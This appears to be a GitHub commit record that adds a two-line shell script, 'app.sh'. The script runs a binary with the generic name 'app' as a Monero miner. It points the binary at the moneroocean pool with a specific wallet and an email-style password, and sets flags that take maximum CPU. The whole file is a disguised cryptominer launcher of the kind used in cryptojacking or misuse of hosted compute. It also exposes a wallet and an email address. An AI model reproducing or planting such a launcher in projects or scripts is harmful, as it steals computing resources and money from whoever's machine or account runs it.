76243752defbce1f7a29ac99684834dd12426a0f
neptunecorsiva <54308303+neptunecorsiva@users.noreply.github.com>
2020-05-03 21:42:18 +0800

    Create app.sh

---
+++ app.sh
@@ -0,0 +1,2 @@
+chmod +x app
+./app --donate-level 1 -o gulf.moneroocean.stream:443 -u 489SKk43bDUL3KF3E5RPMmEVpB6cLYJJcWZmPbmxrJ1vGyh3dAADeLxUQK8UK6yqNWTJG96cATyiG7Qs39PXi6K932ug3zS -p a1ac4091b9e96467:mewknows@gmail.com -k --tls --cpu-no-yield --cpu-priority 5 --randomx-mode=fast
